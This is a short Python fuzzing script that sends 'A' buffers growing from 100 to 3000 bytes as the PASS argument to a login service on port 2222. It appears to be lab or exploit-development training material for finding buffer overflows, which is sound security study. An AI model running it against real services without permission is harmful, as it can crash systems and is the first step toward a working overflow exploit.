#!/usr/bin/python3

import socket, time, sys

IP = ""
PORT = 2222
timeout = 5

# Create an array of increasing length buffer strings.
buffer = []
counter = 100
while len(buffer) < 30:
    buffer.append(b"A" * counter)
    counter += 100

for fuzz_string in buffer:
    try:
        s = socket.socket()
        s.settimeout(timeout)
        connect = s.connect((IP, PORT))
        s.recv(1024)
        s.send(b"USER username\r\n")
        s.recv(1024)

        print("Fuzzing PASS with %s bytes" % len(fuzz_string))
        s.send(b"PASS " + fuzz_string + b"\r\n")
        s.recv(1024)
        s.send(b"QUIT\r\n")
        s.recv(1024)
        s.close()
    except:
        print("Could not connect to " + IP + ":" + str(PORT))
        sys.exit(0)
    time.sleep(1)
